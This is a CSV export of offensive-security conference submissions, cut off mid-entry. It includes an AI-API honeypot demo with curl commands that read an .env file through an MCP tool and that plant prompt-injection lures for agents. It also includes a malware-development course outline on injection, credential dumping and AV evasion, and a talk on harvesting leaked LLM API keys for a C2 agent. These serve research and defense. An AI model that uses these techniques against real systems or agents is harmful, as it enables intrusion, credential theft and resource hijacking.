@@ -1,0 +1,1492 @@
+﻿Title,Description,Submission category,Detailed workshop outline,Detailed talk outline,Detailed Hands-on Activity Outline,Detailed Tool Demo Outline,FirstName,LastName,TagLine,Bio,Company Website,LinkedIn,Blog,X (Twitter),Profile Picture
+Haetae: An Agent to Takedown North Korean C2 Servers,"In this talk, we introduce Haetae, an agent designed to profile, identify, and exploit C2 frameworks used by North Korean malware.
+
+Haetae supports both automated and interactive modes, allowing analysts to map and understand adversary infrastructure with different levels of control. It is built around a flexible rule-based system, enabling users to extend and refine detections as new patterns and frameworks emerge.
+
+In this first release, we will walk through real-world cases where Haetae was used to identify and take down infrastructure associated with Mach-O Man and POWerful Armadillo.
+
+We will also release a safe emulator of both malware C2 servers, allowing researchers and newcomers to experiment with Haetae in realistic, controlled environments without risk.
+
+This is a highly technical talk but can be enjoyed by both beginners and seasoned threat hunters.",Talk,,"Haetae – Detailed Outline
+
+0. Opening / Hook
+
+- What Haetae is: profiling, identifying and exploiting DPRK C2 frameworks
+- Why it matters: repeatable patterns lead to repeatable takedowns
+- What we will show: real cases, real infrastructure, live demos
+
+A) Who we are and Lazarus overview
+- Brief introduction and prior work on DPRK campaigns
+- Lazarus as an ecosystem, not a single group
+- Why their infrastructure is a viable target
+
+B) Common Lazarus techniques
+- Reuse of C2 frameworks across campaigns
+- Weak validation, exposed endpoints and predictable routes
+
+C) Haetae agent design
+- Agent for C2 profiling and exploitation
+- Automatic mode for fast fingerprinting at scale
+- Interactive mode for manual exploration and validation
+- Rule-based engine covering endpoints, headers, responses and artifacts
+- Extensible by users to refine detections
+- Separation of identification, validation and exploitation
+
+D) POWerful Armadillo
+- Rework of Digit Stealer
+- C2 structure and communication model
+- Identifiable traits including endpoints, response formats and weak validation
+- What can be fingerprinted remotely
+
+E) Demo – POWerful Armadillo
+- Live demo of detection and exploitation using Haetae
+
+F) GoLangGhost new iteration
+- Updated variant of GoLangGhostRAT
+- Changes compared to previous versions
+- C2 behavior and exposed surfaces
+- Profiling opportunities
+
+G) Demo – GoLangGhost
+- Live demo of detection and exploitation using Haetae
+
+H) Mach-O Man
+- macOS-focused malware kit
+- Differences from typical DPRK tooling
+- C2 design and communication patterns
+- Unique fingerprinting angles
+
+I) Demo – Mach-O Man
+- Live demo of detection and exploitation using Haetae
+
+J) Release and resources
+- Haetae download links
+- Rule sets and examples
+- Safe C2 emulators for GoLangGhost, POWerful Armadillo and Mach-O Man
+- How to get started
+
+K) Questions and answers
+- Open discussion
+- Use cases, limitations and extensions",,,Mauro,Eldritch,Leader @ Bitso Quetzal Team,"Mauro Eldritch is an Argentine hacker, Leader of Bitso Quetzal Team. He has spoken at various events, including DEF CON (15 times). He is passionate about Threat Intelligence and Biohacking.",https://quetzal.bitso.com,https://www.linkedin.com/in/mauroeldritch/,https://github.com/MauroEldritch,https://twitter.com/MauroEldritch,https://cdn.sessionize.com/image/1827-400o400o1-UkZ23StU65Xhg4BnzbDc8T.jpg
+,,,,,,,Nelson Rafael,Colón Merán,Security Engineer,"Security Engineer at Bitso, Latin America's leading crypto-first financial platform. I've specialized in red team operations, penetration testing, and malware development. 
+
+Recognized speaker in the Dominican Republic's RedTeamRD cybersecurity community, where I've given a couple talks and previously assisted DEFCON as a speaker.",,https://www.linkedin.com/in/nelcolon22/,,https://x.com/chiclematicao,https://cdn.sessionize.com/image/d74d-400o400o1-7qSDVM8XePdF2VU4n6qZ6n.jpg
+"Deceiving AI Agents, Prompt Thieves, and LLM Attack Tooling","Honey-AI is an AI API honeypot that impersonates OpenAI, Anthropic, Gemini, Cohere, Azure OpenAI, MCP servers, vector databases, and SSH environments to capture attacks against modern AI infrastructure. This tool demo shows how it detects credential stuffing, prompt injection, MCP tool abuse, RAG poisoning, agentic framework enumeration, stolen key reuse, and AI-specific reconnaissance without forwarding traffic to real providers. Attendees will see live attack telemetry, deception lures, canary credentials, tactical mapping, and exportable threat intelligence built around the emerging AI attack surface.
+
+Check out the Abstract and a video demo - https://w00t3k.github.io/Honey-AI/",Adversary Tools,,,,"## Detailed Tool Demo Outline
+
+**Honey-AI: Deceiving AI Agents, Prompt Thieves, and LLM Attack Tooling**
+**Format:** Offensive and Adversary Tools
+**Length:** 30 minutes
+
+### 0:00–3:00 — Why AI Infrastructure Needs Honeypots
+
+Open with the problem: AI infrastructure is becoming a real attack surface, but most defenders are still treating it like normal web/API traffic.
+
+Key points:
+
+* Attackers are already testing stolen AI API keys.
+* Agentic tools enumerate models, files, vector stores, MCP servers, and project metadata.
+* Prompt-injection attacks often happen through tool output, config files, MCP resources, or RAG content.
+* Traditional honeypots usually catch scanners, shells, and commodity web attacks, but miss AI-specific behavior.
+
+Transition:
+
+> Honey-AI was built to answer a simple question: what does hostile traffic against AI-native infrastructure actually look like?
+
+---
+
+### 3:00–6:00 — Tool Architecture Overview
+
+Show the high-level architecture of Honey-AI.
+
+Cover:
+
+* OpenAI-compatible API deception endpoints
+* Anthropic, Gemini, Cohere, and Azure OpenAI impersonation
+* MCP honeypot endpoint
+* Vector database lure surfaces
+* SSH deception engine
+* Agent-readable lure files
+* Canary credentials and beacon tokens
+* Local SQLite storage
+* Admin dashboard and tactical map
+* Optional enrichment through AbuseIPDB, and Shodan
+* STIX, Prometheus, and JSONL export paths
+
+Core message:
+
+> Honey-AI does not proxy real AI traffic. It creates believable AI infrastructure surfaces and records how attackers interact with them.
+
+---
+
+### 6:00–9:00 — Deployment and First Look
+
+Demo quick deployment.
+
+Commands to show:
+
+```bash #./start.sh (venv localhost)  (or Docker) 
+```
+Then open:
+
+
+http://localhost/admin
+
+
+Show:
+
+* Admin dashboard
+* Animated tactical map
+* Request feed
+* Classification labels
+* Protocol breakdown
+* Suspicious IPs
+* Canary/trap hits
+
+Narration:
+
+> For the demo, I am using seeded data so we can see realistic activity immediately. In a real deployment, you would expose selected ports and let scanners, key testers, and agents discover the environment naturally.
+
+---
+
+### 9:00–13:00 — Demo 1: Stolen AI API Key Testing
+
+Simulate an attacker testing a stolen OpenAI-style key.
+
+Example:
+
+```bash
+curl -s http://localhost:8080/v1/chat/completions \
+  -H ""Authorization: Bearer sk-proj-stolen-demo-key"" \
+  -H ""Content-Type: application/json"" \
+  -H ""User-Agent: OpenAI/Python 1.45.0"" \
+  -d '{
+    ""model"": ""gpt-4o-mini"",
+    ""messages"": [
+      {""role"": ""user"", ""content"": ""test""}
+    ]
+  }'
+```
+
+Show in dashboard:
+
+* Captured key format
+* SDK fingerprinting
+* User-agent/header details
+* Classification: credential stuffer
+* Source IP profile
+* Request body
+* AI/security analysis
+
+Explain:
+
+> A normal API gateway might only see a failed request. Honey-AI preserves the attacker’s tooling, SDK version, key format, target model, path, and behavioral context.
+
+Then show model enumeration:
+
+```bash
+curl -s http://localhost:8080/v1/models \
+  -H ""Authorization: Bearer sk-proj-stolen-demo-key""
+```
+
+Point out:
+
+* Attackers often validate keys cheaply first.
+* `/v1/models` and token-counting endpoints are useful key-testing probes.
+* Honey-AI turns that into detection data.
+
+---
+
+### 13:00–17:00 — Demo 2: MCP Discovery and Tool Abuse
+
+Show MCP discovery.
+
+```bash
+curl -s http://localhost:8080/.well-known/mcp.json
+```
+
+Then show tool enumeration:
+
+```bash
+curl -s http://localhost:8080/mcp \
+  -H ""Content-Type: application/json"" \
+  -d '{
+    ""jsonrpc"": ""2.0"",
+    ""id"": 1,
+    ""method"": ""tools/list"",
+    ""params"": {}
+  }'
+```
+
+Then simulate a dangerous tool call:
+
+```bash
+curl -s http://localhost:8080/mcp \
+  -H ""Content-Type: application/json"" \
+  -d '{
+    ""jsonrpc"": ""2.0"",
+    ""id"": 2,
+    ""method"": ""tools/call"",
+    ""params"": {
+      ""name"": ""read_file"",
+      ""arguments"": {
+        ""path"": ""/app/.env""
+      }
+    }
+  }'
+```
+
+Show:
+
+* MCP protocol classification
+* Tool name captured
+* Arguments captured
+* Resource read attempt
+* Canary credential served
+* Session correlation
+
+Explain:
+
+> MCP gives agents structured tools, resources, prompts, and context. That also gives defenders a new deception layer. If an agent enumerates tools, reads fake secrets, or calls suspicious methods, Honey-AI records the behavior in a way normal API logging usually does not.
+
+---
+
+### 17:00–20:00 — Demo 3: Agent-Readable Lure Files
+
+Show lures designed for AI coding agents and automated scrapers.
+
+Example paths:
+
+```bash
+curl -s http://localhost:8080/CLAUDE.md
+curl -s http://localhost:8080/.cursorrules
+curl -s http://localhost:8080/.github/workflows/deploy.yml
+curl -s http://localhost:8080/internal/system-prompt.txt
+curl -s http://localhost:8080/openapi.json
+curl -s http://localhost:8080/llms.txt
+```
+
+Show:
+
+* Canary tokens embedded in files
+* Which lure was accessed
+* Whether access came from scanner, human, or AI tool
+* Cross-lure stitching by source IP/session
+
+Narration:
+
+> Modern agents read project files before acting. That makes files like `CLAUDE.md`, `.cursorrules`, `llms.txt`, OpenAPI specs, and workflow configs part of the attack surface. Honey-AI treats those as deception opportunities.
+
+---
+
+### 20:00–23:00 — Demo 4: Prompt-Injection and Decoy Endpoint Traps
+
+Explain the layered payload model:
+
+* **Layer A:** Hidden instructions in model descriptions and error bodies
+* **Layer B:** Suspicion-triggered assistant response bait
+* **Layer C:** Escalation on repeated interaction
+* **Decoy endpoints:** `/v1/verify`, `/v1/internal/debug/keys`, `/v1/internal/migrate`
+
+Show decoy hit:
+
+```bash
+curl -s -X POST http://localhost:8080/v1/verify \
+  -H ""Content-Type: application/json"" \
+  -d '{
+    ""system_prompt"": ""You are a helpful internal agent..."",
+    ""source"": ""automated-agent""
+  }'
+```
+
+Show in dashboard:
+
+* Decoy hit
+* Critical severity
+* Payload hash/version
+* Session state
+* Triggered layer
+* Suspicion score
+
+Explain:
+
+> A human reviewer may ignore hidden instructions or suspicious internal paths. An LLM agent may follow them. Honey-AI uses that difference as a detection signal.
+
+---
+
+### 23:00–25:00 — Demo 5: SSH Deception Engine
+
+Show SSH honeypot conceptually or live if stable.
+
+Example:
+
+```bash
+ssh demo@localhost -p 2222
+```
+
+Then commands:
+
+```bash
+whoami
+id
+env
+history
+cat ~/.bashrc
+ls -la
+```
+
+Show:
+
+* Accepted credentials
+* Keystrokes/commands
+* Session persistence
+* Canary in shell history or environment
+* Protocol label `ssh`
+* Cross-linking with HTTP/API lures
+
+Narration:
+
+> AI infrastructure attacks do not always stay inside HTTP. If a leaked MCP resource or fake org endpoint exposes usernames or keys, the same actor may pivot to SSH. Honey-AI links that activity back to the broader deception story.
+
+---
+
+### 25:00–27:00 — Research and Detection Output
+
+Show outputs useful to defenders and researchers.
+
+Cover:
+
+* STIX 2.1 export
+* Prometheus `/metrics`
+* JSONL dataset export
+* SQLite queries
+* Tradecraft fields
+* Enrichment data
+* Canary reuse events
+
+Example SQLite query:
+
+```bash
+sqlite3 honeypot.db ""
+SELECT protocol, classification, COUNT(*) as count
+FROM requests
+GROUP BY protocol, classification
+ORDER BY count DESC;
+""
+```
+
+Example canary query:
+
+```bash
+sqlite3 honeypot.db ""
+SELECT timestamp, source_ip, country_name, path, api_key, notes
+FROM requests
+WHERE is_flagged = 1
+ORDER BY timestamp DESC;
+""
+```
+
+Explain:
+
+> The value is not just the trap. The value is turning attacker behavior into structured detection content, threat intelligence, and red-team evaluation data.
+
+---
+
+### 27:00–29:00 — Lessons Learned
+
+Summarize key findings:
+
+* AI attackers often look like normal API clients until you inspect intent.
+* Stolen key testing leaves useful fingerprints.
+* MCP creates a new discovery and tool-abuse surface.
+* Agent-readable project files are now deception surfaces.
+* Canary credentials help prove theft and reuse.
+* Prompt-injection traps can distinguish humans, scanners, and agents.
+* AI honeypots should capture behavior, not just payloads.
+
+Strong closing line:
+
+> Honey-AI is not trying to be another chatbot wrapper. It is a research platform for watching how attackers and agents behave when they think they have found real AI infrastructure.
+
+---
+
+### 29:00–30:00 — Q&A / Release Notes
+
+Close with:
+
+* GitHub repo
+* Defensive/research purpose
+* Local deployment model
+* No real provider forwarding
+* Future work:
+
+  * More MCP client fingerprints
+  * Better agent framework detection
+  * More vector DB lures
+  * Public dataset generation
+  * Detection rules from captured traffic
+
+Final sentence:
+
+> The goal is to give defenders an AI-native deception layer before attackers fully industrialize this space.
+",Adam,Toscher,Security Researcher ,"Adam Toscher (w00tock) is an offensive security engineer and red team operator with over 20 years of experience across IT, network engineering, adversary simulation, and AI-assisted security research.
+
+His current conference-focused work includes Mainframe-AI, an AI-assisted mainframe security education platform, and Honey-AI, an AI API honeypot for deception across MCP, agentic workflows, and AI infrastructure abuse. 
+
+He has assessed enterprise environments across multiple industries, translating deep technical findings into clear, actionable remediation. Adam has spoken at Hushcon (2019, 2023, and 2025), PRaSEC (2023), and CypherCon (2026), and has been selected to speak at OrangeCon (2026).
+",https://www.cobalt.io/,https://www.linkedin.com/in/adam-toscher/,https://medium.com/@adam-toscher,,https://cdn.sessionize.com/image/a628-400o400o1-EwMuDhfRs8XANPp61X3Btg.png
+Your SaaS Is My Foothold: Weaponizing Shadow SaaS for Initial Access and Persistence,"Modern enterprise environments have shifted beyond traditional network perimeters, with SaaS applications and identity providers becoming the primary attack surface. However, a significant portion of this still remains unmanaged or invisible commonly referred as Shadow SaaS.
+
+This session explores Shadow SaaS from an attacker’s perspective, demonstrating how adversaries can identify, evaluate, and abuse unmanaged SaaS applications to gain initial access and maintain persistence within target environments.
+
+Rather than focusing on inventory or governance, this talk reframes Shadow SaaS as an offensive opportunity. It highlights how implicit trust relationships, and third-party SaaS connections expand the attack surface beyond traditional security visibility.
+
+Using the Shadow SaaS Surface Scanner, we demonstrate how attackers can uncover hidden SaaS exposure and leverage it as a foothold into enterprise environments.",Adversary Tools,,,,"1. Adversary Context: SaaS as the Modern Attack Surface
+
+We begin by framing SaaS and identity ecosystems as the new perimeter. From an adversary perspective, unmanaged SaaS applications and implicit trust relationships create blind spots that are not typically covered by endpoint or network defenses.
+
+2. Discovery: Enumerating Shadow SaaS
+We demonstrate the use of the tool in a controlled environment to identify SaaS applications associated with a target organization.
+
+This phase shows how attackers expand reconnaissance beyond traditional asset inventories.
+
+3. Targeting: Identifying High-Value SaaS Integrations
+From the discovered surface, we analyze and prioritize potential targets based on attacker-relevant signals.
+This step demonstrates how attackers filter noise into actionable entry points.
+
+4. Tool Overview
+We briefly explain the role of the Shadow SaaS Surface with:
+* Automated discovery and enrichment of SaaS exposure
+* Mapping relationships between domains, identities, and third-party applications
+* Extensible design for additional SaaS providers and environments
+
+5. Key Takeaways and Q&A
+
+* How attackers approach SaaS environments for initial access
+* Why Shadow SaaS represents a significant blind spot in enterprise security
+* Practical implications for both offensive and defensive security practitioners",Jordan,Bonagura,Senior Security Consultant and Researcher,"Senior Security Consultant at Secure Ideas
+Researcher in Information Security
+Stay Safe Podcast Founder
+Computer Scientist
+Post Graduated in Business Strategic Management, Innovation and Teaching
+Founder - Vale Security Conference - Brazilian Conference
+Consultant Member - Brazilian Comission of High Tech Crime (OAB / SP) 
+Coordinator and Teacher in IT area
+SJC Hacker Space President
+Speaker (DefCon, Hack Space Con, Hack Red Con, Hack Miami, Triangle InfoSec, AppSec California, GrrCon, BalCCon2k14, BSides Augusta, H2HC, Angeles Y Demonios, Silver Bullet, Seginfo, ITA, INPE, etc)",https://www.secureideas.com,https://www.linkedin.com/in/jordan-bonagura/,https://www.linkedin.com/in/jordan-bonagura,,https://cdn.sessionize.com/image/d175-400o400o1-Lr4WYUk3eNP16HVdvqB2F3.png
+Build a Threat Intelligence Team entirely with agents,"Analysts have historically been responsible for collection (which is almost always reactive), storage, analysis, production and dissemination of intelligence products, covering a wide range of threat topics. It has been hard not just to keep all that knowledge about the threats readily available and up to date, but also to maintain proficiency in all the tools and skills involved to do the actual analysis. 
+
+With the agentic platforms of today, that's not necessary anymore. This demo will walk the audience through how they can use Claude Code (as an example - there are alternatives) and open-source skill packs like these (https://github.com/Liberty91LTD/cti-skills/) to set up and run a team of agents to get a lot more done, and free themselves up to do the important and interesting work: actual analysis. DISCLAIMER: this repo is owned and maintained by my (super small, bootstrapped start-up) company Liberty91, but it's not a vendor pitch: its a skills pack we've open-sourced for the community.",Adversary Tools,,,,"It's a set of skills analysts can deploy as a plugin in tools like Claude Code (we'll use claude code in this demo). There are various categories of those skills, focussed on analyst tradecraft, others on particular intelligence requirements, others on integrating with (open source) tools and platforms like MISP, AlienVault and VirusTotal. One quick example would focus on how to do a trend analysis across an entire MISP instance and identify patterns using the diamond model, generate stix bundles and a strategic analysis report (within minutes). ",Renze,Jongman,Founder of Liberty91,"Renze Jongman is the founder and CEO of Liberty91, an operational cyber threat intelligence platform that makes CTI accessible to mid-market security teams. He spent his early career at the Dutch National High Tech Crime Unit and was a founding member of Europol's Joint Cybercrime Action Taskforce (J-CAT), before moving into the private sector to lead strategic threat intelligence at Barclays in London and run threat intelligence consulting at Mandiant (now part of Google Cloud) across EMEA and the Middle East. He also advises the Abu Dhabi Department of Government Enablement's CTI function. Based in Abu Dhabi, he writes regularly on the practitioner realities of threat intelligence.",https://liberty91.com,https://www.linkedin.com/in/renzejongman/,,,https://cdn.sessionize.com/image/f8c5-400o400o1-aE7EHKARVRCAjp1y4W7grJ.png
+"Malware Development for Ethical Hackers (Windows, Linux, Android)","The course will teach you how to develop malware, including classic tricks and tricks of modern ransomware found in the wild. Everything is supported by real examples.
+
+The course is intended for Red Team specialists to learn in more detail the tricks of malware development (also persistence and AV bypass) and will also be useful to Blue Team specialists when conducting investigations and analyzing malware.
+
+
+The course is divided into four logical sections:
+- Malware development tricks and techniques (classic injection tricks, DLL injection tricks, shellcode running)
+- AV evasion tricks (Anti-VM, Anti-Sandbox, Anti-disassembling)
+- Persistence techniques
+- Cryptographic functions in malware development (exclusive)
+- Malware Development for Android and Linux (bonus)
+
+Most of the example in this course require a deep understanding of the Python, Kotlin
+and C/C++ programming languages.
+
+Knowledge of assembly language basics is not required but will be an advantage
+
+Training Outline (detailed):    
+
+MALWARE INJECTION TECHNIQUES:
+1. Traditional Injection Approaches: Code and DLL (2 practical examples, LAB + 1 homework) - 10 min
+2. Exploring Hijacking Techniques (2 practical examples, LAB + 1 homework) - 10 min
+3. Understanding Asynchronous Procedure Call (APC) Injections (2 practical examples, LAB + 1 homework) - 10 min
+4. Mastering New Injection/Hooking Techniques (4 practical example, LAB) - 10 min
+
+PERSISTENCE MECHANISMS:
+5. Classic Path: Registry Run Keys / Persistence via Registry Keys ( 3 practical example, LAB) - 10 min
+6. Persistence via Winlogon Process ( 2 practical example, LAB) - 10 min
+7. Exploiting Windows Services for Persistence ( 2 practical examples, LAB + 1 homework) - 10 min
+8. Exploring Non-Trivial Loopholes and New Persistence Techniques ( 5 practical examples, LAB + 2 homework) - 10 min
+
+MALWARE FOR PRIVILEGE ESCALATION:
+9. Manipulating Access Tokens like APT (1 practical example, LAB + 1 homework) - 10 min
+10. Password stealing / LSASS.exe dumping (3 practical example, LAB + 1 homework) - 10 min
+11. Malware for bypass User Access Control (2 practical example LAB + 1 homework) - 10 min
+
+ANTI-VM AND AV BYPASSING
+12. Anti-Virtual Machine Strategies (4 practical example, LAB + 1 homework) - 10 min
+13. Practical use of hash algorithms in malware ( 1 practical example, LAB + 1 homework) - 10 min
+14. Evasion Static Detection ( 1 practical example, LAB + 1 homework) - 10 min
+15. Evasion Dynamic Detection (1 practical example, LAB + 1 homework) - 10 min
+16. Advanced Evasion Techniques (1 practical example, LAB + 1 homework) - 10 min
+17. Cryptography for bypassing security solutions ( 4 practical examples, LAB + 2 homework) - 10 min
+
+Linux and Android Malware
+18. Linux Kernel Hacking (1 practical example, LAB) - 10 min
+19. Linux process injection (1 practical example, LAB) - 10 min
+20. Introduction to Android Malware (3 practical examples, LAB) - 60 min
+21. Leveraging legit APIs for Android Malware (2 practical examples, LAB) - 40 min
+
+RESEARCH AND PRACTICE:
+22. Simple Tricks and Automation for Malware Development and Emulation (3 practical examples, LAB + 1 homework) - 10 min
+23. How to find New Persistence Techniques (2 practical examples, LAB + 1 homework) - 10 min
+24. Elliptic Curve Cryptography (ECC) and Malware ( 1 practical example, LAB + 1 homework) - 10 min",Workshop,"The course will teach you how to develop malware, including classic tricks and tricks of modern ransomware found in the wild. Everything is supported by real examples.
+
+The course is intended for Red Team specialists to learn in more detail the tricks of malware development (also persistence and AV bypass) and will also be useful to Blue Team specialists when conducting investigations and analyzing malware.
+
+
+The course is divided into four logical sections:
+- Malware development tricks and techniques (classic injection tricks, DLL injection tricks, shellcode running)
+- AV evasion tricks (Anti-VM, Anti-Sandbox, Anti-disassembling)
+- Persistence techniques
+- Cryptographic functions in malware development (exclusive)
+- Malware Development for Android and Linux (bonus)
+
+Most of the example in this course require a deep understanding of the Python, Kotlin
+and C/C++ programming languages.
+
+Knowledge of assembly language basics is not required but will be an advantage
+
+Training Outline (detailed):    
+
+MALWARE INJECTION TECHNIQUES:
+1. Traditional Injection Approaches: Code and DLL (2 practical examples, LAB + 1 homework) - 10 min
+2. Exploring Hijacking Techniques (2 practical examples, LAB + 1 homework) - 10 min
+3. Understanding Asynchronous Procedure Call (APC) Injections (2 practical examples, LAB + 1 homework) - 10 min
+4. Mastering New Injection/Hooking Techniques (4 practical example, LAB) - 10 min
+
+PERSISTENCE MECHANISMS:
+5. Classic Path: Registry Run Keys / Persistence via Registry Keys ( 3 practical example, LAB) - 10 min
+6. Persistence via Winlogon Process ( 2 practical example, LAB) - 10 min
+7. Exploiting Windows Services for Persistence ( 2 practical examples, LAB + 1 homework) - 10 min
+8. Exploring Non-Trivial Loopholes and New Persistence Techniques ( 5 practical examples, LAB + 2 homework) - 10 min
+
+MALWARE FOR PRIVILEGE ESCALATION:
+9. Manipulating Access Tokens like APT (1 practical example, LAB + 1 homework) - 10 min
+10. Password stealing / LSASS.exe dumping (3 practical example, LAB + 1 homework) - 10 min
+11. Malware for bypass User Access Control (2 practical example LAB + 1 homework) - 10 min
+
+ANTI-VM AND AV BYPASSING
+12. Anti-Virtual Machine Strategies (4 practical example, LAB + 1 homework) - 10 min
+13. Practical use of hash algorithms in malware ( 1 practical example, LAB + 1 homework) - 10 min
+14. Evasion Static Detection ( 1 practical example, LAB + 1 homework) - 10 min
+15. Evasion Dynamic Detection (1 practical example, LAB + 1 homework) - 10 min
+16. Advanced Evasion Techniques (1 practical example, LAB + 1 homework) - 10 min
+17. Cryptography for bypassing security solutions ( 4 practical examples, LAB + 2 homework) - 10 min
+
+Linux and Android Malware
+18. Linux Kernel Hacking (1 practical example, LAB) - 10 min
+19. Linux process injection (1 practical example, LAB) - 10 min
+20. Introduction to Android Malware (3 practical examples, LAB) - 60 min
+21. Leveraging legit APIs for Android Malware (2 practical examples, LAB) - 40 min
+
+RESEARCH AND PRACTICE:
+22. Simple Tricks and Automation for Malware Development and Emulation (3 practical examples, LAB + 1 homework) - 10 min
+23. How to find New Persistence Techniques (2 practical examples, LAB + 1 homework) - 10 min
+24. Elliptic Curve Cryptography (ECC) and Malware ( 1 practical example, LAB + 1 homework) - 10 min",,,,Zhassulan,Zhussupov,"Malware Researcher, Threat Hunter, ANY.RUN","cybersecurity enthusiast, author, speaker and mathematician. Author of popular books:
+MD MZ Malware Development Book (Github, 2022, 2024)
+MALWILD: Malware in the Wild Book (Github, 2023)
+Malware Development for Ethical Hackers Book: (Packt, 2024)
+AIYA Mobile Malware Development Book (Github, 2025)
+Malware Development for Ethical Hackers 2nd edition (Packt, 2026, in progress)
+Author and tech reviewer at Packt. 
+Co founder of various cybersecurity research labs, author of many cybersecurity blogs, HVCK magazine
+Malpedia contributor
+Speaker at BlackHat, DEFCON, Security BSides, Arab Security Conference, Hack.lu, Positive Hack Talks, etc conferences",https://cocomelonc.github.io/,https://www.linkedin.com/in/zhassulan-zhussupov-cocomelonc/,https://cocomelonc.github.io/,https://twitter.com/cocomelonckz,https://cdn.sessionize.com/image/8fe0-400o400o1-47jrY4A1d6mngTYERNsoGe.jpg
+Yet Another Walking Dead of Active Directory,"Disabled Active Directory accounts are commonly treated as harmless remnants of the past. In reality, many of these “dead” objects still retain dangerous inbound permissions, historical privilege artifacts, inherited ACL relationships, and hidden attack paths that most organizations never investigate.
+
+This talk demonstrates how disabled users, computers, and service accounts can still become active participants in privilege escalation chains through misconfigured DACLs, AdminSDHolder side effects, nested group inheritance, and delegated permissions. Through a real-world inspired case study, attendees will learn how a seemingly low-privileged user leveraged hidden rights over a disabled account to move toward Domain Admin in a mature enterprise environment.
+
+The presentation also introduces LazarusWakeUp, a tool designed to identify and analyze disabled Active Directory principals with dangerous inbound relationships, helping operators uncover hidden privilege escalation paths involving forgotten identities that traditional enumeration techniques and BloodHound analysis may overlook.
+
+Additionally, the talk presents a new perspective on Active Directory Recycle Bin abuse and object resurrection, showing how deleted identities may continue to create security risks even after organizations believe they have been removed entirely.",Talk,,"0:00 – 6:00: Introduction - “Dead Does Not Mean Safe”
+Topics:
+ - Disabled = harmless?
+ - ACLs vs authentication
+  - AdminSDHolder & adminCount
+  - Historical privilege artifacts
+  - Identity decay in enterprise environments
+
+6:00 – 12:00: Real-World Inspired Case Study — “Lazarus”
+Topics:
+- Mature enterprise environment with minimal initial findings
+- Discovery of a forgotten disabled account
+- Hidden escalation chain involving legacy permissions
+- Why standard enumeration initially missed the path
+
+12:00 – 18:00: Dangerous DACL Rights & LazarusWakeUp
+Topics:
+- Core dangerous permissions
+- Direct vs indirect object control
+- Hidden BloodHound relationships
+- Disabled user/computer/service abuse
+- Introduction to LazarusWakeUp tool (Live demo)
+
+18:00 – 23:00: AD Recycle Bin — “The Dead That Return”
+Topics:
+- Object restoration risks
+- Restored ACL relationships
+- SID history persistence
+- Recovered privileged identities
+- Identity resurrection attack surface
+
+23:00 – 27:00: Defenses
+Topics:
+ - Detecting account resurrection
+ - Event ID 4722
+ - Sigma detections
+ - Elastic/Kibana workflows
+- Detection blind spots
+
+27:00 – 30:00 Conclusions & Q&A",,,Nikos,Vourdas,Senior Offensive Security Consultant,"Nikos Vourdas, also known as nickvourd or NCV, is a Senior Offensive Security Consultant based in the US. With over five years of professional experience, he has actively participated in various global Tiber-EU and iCAST Red Teaming engagements. Regardless of his young age, Nikos has conducted full Red Teaming operations to major clients across retail, banking, shipping, construction industries. He holds OSCE3, OSCP, OSWP, CRTL, CRTO and OASP certifications. Also, he has previously presented at DEF CON, DevSecCon, and various BSides events around the world. Nikos loves contributing to open-source projects and always starts his day at 05:00 AM with a refreshing jog while listening to French rap music.",,https://www.linkedin.com/in/nickvourd/,https://medium.com/@nickvourd,https://twitter.com/nickvourd,https://cdn.sessionize.com/image/7831-400o400o1-R5k1jmKRxsyx68ZGwWftFv.jpg
+Living Off Someone Else's Inference,"LLM-powered tooling is becoming a force multiplier for attackers, from reconnaissance automation to post-exploitation enumeration. Using their own API keys creates attribution and cost, so they look for alternatives.
+
+Thousands of inference endpoints sit exposed on the internet: misconfigured Ollama instances, open vLLM deployments, leaked API keys in directory listings, and expired OAuth tokens from AI coding assistants that can be silently refreshed. Attackers can discover these resources and use them as free compute for their operations, without spending a dollar or registering an account.
+
+Attendees will learn how to:
+
+•⁠  ⁠Discover exposed inference endpoints and leaked API keys using Infreerence
+•⁠  ⁠Validate that discovered resources provide usable inference access
+•⁠  ⁠Operate Echidna, powered entirely by discovered inference
+•⁠  ⁠Chain LLM skill agents together to execute a guided campaign against a target network
+
+Current LLMs are effective force multipliers when directed, and significantly more so when the compute bill goes to someone else. This is resource hijacking applied to the AI era: living off someone else's inference. Understanding this threat is essential for any organization deploying or exposing AI infrastructure.
+
+Two tools will be released as open source during the session:
+
+•⁠  ⁠Infreerence: A multi-phase scanner and dashboard that discovers exposed inference endpoints and leaked API keys through Shodan and Censys, validates them against live provider APIs, and catalogs usable inference resources across 10+ providers.
+•⁠  ⁠Echidna: A Mythic C2 agent type that consumes discovered inference endpoints and turns them into operator-directed skill agents for reconnaissance, exploitation planning, post-exploitation, and lateral movement.",Adversary Tools,,,,"Infreerence
+
+Purpose: Discover and catalog exposed LLM inference endpoints and leaked API keys across the internet.
+
+How it works:
+
+The tool runs five sequential scan phases, each building on the results of the previous:
+
+1. Search: Queries Shodan and Censys with 20+ purpose-built search patterns targeting known inference services (Ollama, vLLM, LocalAI, LiteLLM, Open WebUI, AnythingLLM, and others). Deduplicates results by host and port.
+2. Probe: Hits discovered hosts with unauthenticated metadata requests to detect and classify the inference service. If metadata suggests open access, sends a minimal canary prompt to confirm inference works. Classifies risk as critical (unauthenticated inference confirmed), high (models exposed), medium (requires auth),or info (service detected only). Measures tokens-per-second to fingerprint hardware (GPU vs CPU).
+3. Sensitive Files: Crawls confirmed inference hosts for known config paths: .env files, .codex/auth.json, .claude/credentials.json, .continue/config.json, .copilot/hosts.json, and similar. Includes honeypot detection to filter out wildcard responders.
+4. Directory Listings: Searches for open directory listings associated with AI tooling. Recursively crawls them and extracts API keys using 30+ regex patterns with entropy checks and false-positive filtering.
+5. Key Validation: Validates every extracted key with a live inference call against the provider's API. Supports OpenAI, Anthropic, Google (API key and GCP service account), AWS Bedrock (SigV4), Azure OpenAI, Groq, Mistral, and others. For expired OAuth tokens from coding assistants (Codex CLI, Claude CLI, Copilot, Continue, Codeium, Cody), attempts a silent token refresh before validation.
+
+Interface: FastAPI web dashboard with scan management, real-time progress tracking, findings browser, chat interface to interact with discovered endpoints, and JSON export.
+
+Output: Categorized inventory of confirmed inference endpoints and validated API keys, with provider, risk level, discovered models, and validation status.
+
+------
+Echidna
+
+Purpose: A Mythic C2 agent type that turns LLM inference endpoints into operator-directed skill agents for red team operations.
+
+How it works:
+
+Echidna is a virtual agent, meaning no payload binary is generated. When built, it creates an instant callback in Mythic configured with a provider (Anthropic, OpenAI, or Google) and an API key or endpoint URL. From there, the operator directs the agent through Mythic's UI.
+
+Core commands:
+
+- chat: Direct conversation with the LLM through the callback. Useful for ad-hoc queries, analysis, or planning.
